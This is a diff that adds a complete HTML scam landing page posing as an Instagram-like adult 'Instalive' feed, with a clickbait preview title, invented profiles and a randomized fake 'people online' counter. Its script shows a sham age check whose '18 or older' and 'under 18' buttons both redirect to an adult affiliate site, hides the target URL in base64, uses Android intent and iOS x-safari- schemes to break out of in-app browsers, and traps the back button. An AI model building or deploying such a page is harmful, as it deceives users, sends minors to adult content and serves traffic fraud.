@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="Sent you a private photo tap to see👀">
+    <meta property="og:description" content="Connect with singles worldwide on iLoves - the premium international dating platform for meaningful connections">
+    <meta property="og:image" content="https://datingthreads.online/pr/pr1.png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <title>Instalive 🔞</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, Arial, sans-serif; }
+        body { display: flex; justify-content: center; align-items: center; min-height: 100vh; background: linear-gradient(45deg, #ffc7e3, #9ad7ff); padding: 10px; }
+        .container { width: 100%; max-width: 450px; height: 95vh; border-radius: 15px; overflow: hidden; box-shadow: 0 10px 25px rgba(0,0,0,.2); background-color: #fff; position: relative; overflow-y: auto; }
+        .blur-background { filter: blur(5px); transition: filter 0.3s ease; }
+        .header { display:flex; justify-content:space-between; align-items:center; padding:12px 15px; border-bottom:1px solid #dbdbdb; background: linear-gradient(to right,#ff3366,#ff9966); color:white; position:sticky; top:0; z-index:10; }
+        .header img { height:35px; }
+        .header span { font-weight:bold; font-size:18px; }
+        .online-counter { background-color:#f8f8f8; padding:8px 15px; text-align:center; font-size:13px; color:#ff3366; border-bottom:1px solid #eee; display:flex; align-items:center; justify-content:center; gap:5px; }
+        .online-counter .dot { width:8px; height:8px; background-color:#4cd964; border-radius:50%; display:inline-block; }
+        .search-bar { padding:12px 15px; border-bottom:1px solid #dbdbdb; background-color:#fff; }
+        .search-bar input { width:100%; padding:10px 15px; border:1px solid #dbdbdb; border-radius:20px; background-color:#fafafa; font-size:14px; outline:none; }
+        .search-bar input:focus { border-color:#a8a8a8; }
+        .stories { display:flex; overflow-x:auto; padding:15px 10px; border-bottom:1px solid #dbdbdb; background-color:#fff; }
+        .stories::-webkit-scrollbar { display:none; }
+        .story { flex:0 0 auto; width:70px; text-align:center; margin-right:15px; position:relative; }
+        .story img { width:65px; height:65px; border-radius:50%; border:3px solid #ff3366; padding:2px; object-fit:cover; }
+        .story .live-badge { position:absolute; bottom:0; left:50%; transform:translateX(-50%); background-color:#ff3366; color:white; font-size:10px; padding:2px 5px; border-radius:3px; }
+        .post { background-color:#fff; border:1px solid #dbdbdb; border-radius:10px; margin:15px; overflow:hidden; box-shadow:0 2px 8px rgba(0,0,0,0.05); }
+        .post-header { display:flex; align-items:center; padding:12px; }
+        .post-header img { width:35px; height:35px; border-radius:50%; margin-right:10px; object-fit:cover; border:2px solid #ff9966; }
+        .post-header .username { font-weight:bold; color:#262626; }
+        .post-header .location { font-size:12px; color:#8e8e8e; margin-top:2px; }
+        .post-media { width:100%; aspect-ratio:9/16; overflow:hidden; display:flex; justify-content:center; align-items:center; background:linear-gradient(45deg,#ffc7e3,#9ad7ff); position:relative; }
+        .post-media img, .post-media video { width:100%; height:100%; object-fit:cover; }
+        .post-actions { display:flex; justify-content:space-between; padding:12px; }
+        .post-actions .left-actions { display:flex; gap:15px; }
+        .post-actions i { font-size:24px; color:#262626; cursor:pointer; }
+        .post-actions .fa-heart { color:#ff3366; }
+        .post-likes { padding:0 12px; font-weight:bold; color:#262626; font-size:14px; }
+        .post-caption { padding:5px 12px 12px; color:#262626; font-size:14px; }
+        .post-caption .username { font-weight:bold; margin-right:5px; }
+        .post-time { padding:0 12px 12px; color:#8e8e8e; font-size:12px; }
+        .footer { position:sticky; bottom:0; width:100%; background-color:#fff; border-top:1px solid #dbdbdb; display:flex; justify-content:space-around; padding:12px 0; }
+        .footer i { font-size:24px; color:#262626; }
+        .footer .active { color:#ff3366; }
+        .popup-container { display:none; position:fixed; top:0; left:0; width:100%; height:100%; z-index:1000; animation:fadeIn 0.3s ease; }
+        @keyframes fadeIn { from{opacity:0;} to{opacity:1;} }
+        .popup-overlay { position:absolute; top:0; left:0; width:100%; height:100%; background-color:rgba(0,0,0,0.7); }
+        .popup { position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); background-color:#fff; padding:25px; border-radius:15px; box-shadow:0 10px 30px rgba(0,0,0,0.3); text-align:center; z-index:1001; width:85%; max-width:320px; animation:popIn 0.4s ease; }
+        @keyframes popIn { 0%{ transform:translate(-50%,-50%) scale(0.9); opacity:0 } 100%{ transform:translate(-50%,-50%) scale(1); opacity:1 } }
+        .popup h2 { margin-bottom:15px; font-size:22px; color:#ff3366; }
+        .popup p { margin-bottom:20px; color:#666; font-size:15px; line-height:1.4; }
+        .popup-options { display:flex; flex-direction:column; gap:12px; }
+        .popup-options a { display:block; padding:14px 20px; border-radius:8px; cursor:pointer; font-size:16px; text-decoration:none; font-weight:bold; transition:all .2s ease; text-align:center; }
+        .popup-options .option-18 { background:linear-gradient(to right,#ff3366,#ff9966); color:#fff; box-shadow:0 4px 10px rgba(255,51,102,0.3); }
+        .popup-options .option-under { background-color:#f0f0f0; color:#666; }
+        .popup-options a:hover { transform:translateY(-2px); box-shadow:0 6px 15px rgba(0,0,0,0.15); }
+        .popup-options .option-18:hover { box-shadow:0 6px 15px rgba(255,51,102,0.4); }
+        .warning-icon { font-size:40px; color:#ff3366; margin-bottom:15px; }
+
+        /* Full-screen loader shown on click */
+        .redirect-loader { display:none; position:fixed; inset:0; background:rgba(255,255,255,0.95); z-index:2000; align-items:center; justify-content:center; }
+        .redirect-loader .loader-circle { border:8px solid #f3f3f3; border-top:8px solid #6366f1; border-radius:50%; width:60px; height:60px; animation:spin 1s linear infinite; }
+        @keyframes spin { 0%{ transform:rotate(0deg) } 100%{ transform:rotate(360deg) } }
+    </style>
+</head>
+<body>
+    <div class="container" id="mainContainer">
+        <!-- Header -->
+        <div class="header">
+            <img src="https://starimg.ru/uploads/dc7a9992d1.webp" alt="Logo">
+            <span>Instalive</span>
+            <i class="fas fa-comment"></i>
+        </div>
+
+        <!-- Online Counter -->
+        <div class="online-counter">
+            <span class="dot"></span>
+            <span class="count">423 people online now</span>
+        </div>
+
+        <!-- Search Bar -->
+        <div class="search-bar">
+            <input type="text" placeholder="Search for hot profiles...">
+        </div>
+
+        <!-- Stories -->
+        <div class="stories">
+            <div class="story">
+                <img src="https://starimg.ru/uploads/e4c1ed484f.webp" alt="Story 1">
+                <div class="live-badge">LIVE</div>
+            </div>
+            <div class="story">
+                <img src="https://starimg.ru/uploads/4984010008.webp" alt="Story 2">
+                <div class="live-badge">LIVE</div>
+            </div>
+            <div class="story">
+                <img src="https://starimg.ru/uploads/61e8bc1f8b.webp" alt="Story 3">
+                <div class="live-badge">LIVE</div>
+            </div>
+        </div>
+
+        <!-- Post 1 -->
+        <div class="post">
+            <div class="post-header">
+                <img src="https://starimg.ru/uploads/57b7d0517a.webp" alt="User 1">
+                <div>
+                    <div class="username">LucilexCazal</div>
+                    <div class="location">Nearby • 2km away</div>
+                </div>
+            </div>
+            <div class="post-media">
+                <img src="https://starimg.ru/uploads/1f81b0bd86.webp" alt="Post 1">
+            </div>
+            <div class="post-actions">
+                <div class="left-actions">
+                    <i class="fas fa-heart"></i>
+                    <i class="far fa-comment"></i>
+                    <i class="far fa-paper-plane"></i>
+                </div>
+                <i class="far fa-bookmark"></i>
+            </div>
+            <div class="post-likes">6,940 likes</div>
+            <div class="post-caption"><span class="username">LucilexCazal</span> Let's have some fun together! Chat with me and get exclusive content 😈💋</div>
+            <div class="post-time">15 MINUTES AGO</div>
+        </div>
+
+        <!-- Post 2 -->
+        <div class="post">
+            <div class="post-header">
+                <img src="https://starimg.ru/uploads/9e58238517.webp" alt="User 2">
+                <div>
+                    <div class="username">Kristen.tooswett</div>
+                    <div class="location">Online now • 5km away</div>
+                </div>
+            </div>
+            <div class="post-media">
+                <img src="https://starimg.ru/uploads/8f98b3c2b3.webp" alt="Post 1">
+            </div>
+            <div class="post-actions">
+                <div class="left-actions">
+                    <i class="fas fa-heart"></i>
+                    <i class="far fa-comment"></i>
+                    <i class="far fa-paper-plane"></i>
+                </div>
+                <i class="far fa-bookmark"></i>
+            </div>
+            <div class="post-likes">5,231 likes</div>
+            <div class="post-caption"><span class="username">Kristen.tooswett</span> Waiting for you in my private room 😘 Special show starting soon!</div>
+            <div class="post-time">JUST NOW</div>
+        </div>
+
+        <!-- Post 3 -->
+        <div class="post">
+            <div class="post-header">
+                <img src="https://ik.imagekit.io/i0z8kppqq/ik-video.webm/ik-video.mp4?updatedAt=1760979794223" alt="User 3">
+                <div>
+                    <div class="username">alenna18</div>
+                    <div class="location">Live now • 7km away</div>
+                </div>
+            </div>
+            <div class="post-media">
+                <img src="https://ik.imagekit.io/i0z8kppqq/Snapinsta.app_403996132_1518573312266125_6182502581450903404_n_1080.webp?updatedAt=1760979793775" alt="Post 3">
+            </div>
+            <div class="post-actions">
+                <div class="left-actions">
+                    <i class="fas fa-heart"></i>
+                    <i class="far fa-comment"></i>
+                    <i class="far fa-paper-plane"></i>
+                </div>
+                <i class="far fa-bookmark"></i>
+            </div>
+            <div class="post-likes">8,923 likes</div>
+            <div class="post-caption"><span class="username">alenna18</span> Special show tonight only! Don't miss it 💋 Join my private page for 50% off!</div>
+            <div class="post-time">45 MINUTES AGO</div>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <i class="fas fa-home active"></i>
+            <i class="fas fa-search"></i>
+            <i class="fas fa-plus-square"></i>
+            <i class="fas fa-video"></i>
+            <i class="far fa-user"></i>
+        </div>
+    </div>
+
+    <!-- Age Verification Popup -->
+    <div class="popup-container" id="popupContainer">
+        <div class="popup-overlay"></div>
+        <div class="popup" id="popup">
+            <div class="warning-icon">
+                <i class="fas fa-exclamation-circle"></i>
+            </div>
+            <h2>Adult Content Ahead</h2>
+            <p>This content is restricted to users who are 18 years or older. Please verify your age to continue.</p>
+            <div class="popup-options">
+                <!-- теперь у ссылок нет href, вместо этого data-encoded содержит base64-строку -->
+                <a href="#" class="option-18" id="option18" data-encoded="">I am 18 or older</a>
+                <a href="#" class="option-under" id="optionUnder" data-encoded="">I am under 18</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Full-screen loader that показывается при клике -->
+    <div class="redirect-loader" id="redirectLoader">
+        <div class="loader-circle"></div>
+    </div>
+
+<script>
+    // Array link tujuan random untuk popup
+    const randomLinks = [
+        "https://enticingwomen.com/?utm_source=bvLhkROgT7ALT0&utm_campaign=com1"
+    ];
+
+    // Функция выбора случайной ссылки и кодирования base64
+    function chooseAndEncodeRandomLink() {
+        const index = Math.floor(Math.random() * randomLinks.length);
+        const url = randomLinks[index];
+        try {
+            return btoa(url); // base64
+        } catch (e) {
+            // btoa может выбросить на небезопасных символах, тогда используем encodeURIComponent
+            return btoa(encodeURIComponent(url));
+        }
+    }
+
+    // Декодирование base64, учитывая возможное encodeURIComponent
+    function safeAtob(encoded) {
+        try {
+            const decoded = atob(encoded);
+            // попробуем распаковать, если было encodeURIComponent
+            try {
+                return decodeURIComponent(decoded);
+            } catch (e) {
+                return decoded;
+            }
+        } catch (e) {
+            return null;
+        }
+    }
+
+    // Redirect logic (как в примере)
+    function performRedirectFromEncoded(encoded) {
+        const redirectUrlRaw = safeAtob(encoded);
+        if (!redirectUrlRaw) return;
+
+        let finalUrl = redirectUrlRaw;
+
+        // Пытаемся заменить utm_campaign если в location.search есть online=myinstagram_...
+        try {
+            const params = new URLSearchParams(window.location.search);
+            const onlineParam = params.get('online');
+            if (onlineParam && onlineParam.includes('myinstagram_')) {
+                const igValue = onlineParam.split('myinstagram_')[1];
+                if (igValue) {
+                    // если в finalUrl уже есть utm_campaign — заменим, иначе добавим/добавим параметр
+                    if (/utm_campaign=[^&]*/.test(finalUrl)) {
+                        finalUrl = finalUrl.replace(/utm_campaign=[^&]*/, 'utm_campaign=' + encodeURIComponent(igValue));
+                    } else {
+                        const sep = finalUrl.includes('?') ? '&' : '?';
+                        finalUrl = finalUrl + sep + 'utm_campaign=' + encodeURIComponent(igValue);
+                    }
+                }
+            }
+        } catch (e) {
+            // ignore
+        }
+
+        const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+        const isAndroid = /android/i.test(userAgent);
+        const isIOS = /iPad|iPhone|iPod/.test(userAgent) && !window.MSStream;
+
+        try {
+            // special handling: intent for android, x-safari- for iOS (как в примере)
+            if (isAndroid) {
+                // составляем intent://...#Intent;scheme=https;end
+                // убираем leading https:// чтобы составить intent URL корректно
+                const withoutProto = finalUrl.replace(/^https?:\/\//i, '');
+                const intentUrl = 'intent://' + withoutProto + '#Intent;scheme=https;end';
+                window.location.href = intentUrl;
+            } else if (isIOS) {
+                window.location.href = 'x-safari-' + finalUrl;
+            } else {
+                window.location.href = finalUrl;
+            }
+        } catch (err) {
+            // в случае ошибки — просто пробуем обычный переход
+            window.location.href = finalUrl;
+        }
+    }
+
+    // Показываем лоадер и запускаем редирект
+    function startRedirect(encoded) {
+        const loader = document.getElementById('redirectLoader');
+        loader.style.display = 'flex';
+        // небольшой таймаут чтобы лоадер успел показаться и пользователь увидел отзыв
+        setTimeout(() => {
+            performRedirectFromEncoded(encoded);
+        }, 150);
+    }
+
+    // Установка data-encoded для кнопок при загрузке страницы
+    window.addEventListener('DOMContentLoaded', () => {
+        // кодируем случайную ссылку и присваиваем data-encoded обеим кнопкам
+        const encoded = chooseAndEncodeRandomLink();
+        const option18 = document.getElementById('option18');
+        const optionUnder = document.getElementById('optionUnder');
+
+        option18.setAttribute('data-encoded', encoded);
+        optionUnder.setAttribute('data-encoded', encoded);
+
+        // повесим обработчики клика, чтобы использовать логику из второго файла
+        [option18, optionUnder].forEach(el => {
+            el.addEventListener('click', function(e) {
+                e.preventDefault();
+                const enc = this.getAttribute('data-encoded');
+                if (!enc) return;
+                // размытие фона как раньше
+                document.getElementById('mainContainer').classList.add('blur-background');
+                // закрываем popup визуально (оставим loader)
+                document.getElementById('popupContainer').style.display = 'none';
+                // запуск редиректа
+                startRedirect(enc);
+            });
+        });
+
+        // Show popup after 2 seconds (как было)
+        setTimeout(function() {
+            document.getElementById('mainContainer').classList.add('blur-background');
+            document.getElementById('popupContainer').style.display = 'block';
+        }, 2000);
+
+        // Update online counter
+        function updateOnlineCounter() {
+            const baseCount = 400;
+            const randomCount = Math.floor(Math.random() * 50) + 1;
+            const totalCount = baseCount + randomCount;
+            document.querySelector('.count').textContent = `${totalCount} people online now`;
+        }
+        updateOnlineCounter();
+        setInterval(updateOnlineCounter, 30000);
+
+        // Prevent back button (как было)
+        history.pushState(null, null, document.URL);
+        window.addEventListener('popstate', function() {
+            history.pushState(null, null, document.URL);
+        });
+    });
+</script>
+</body>
+</html>
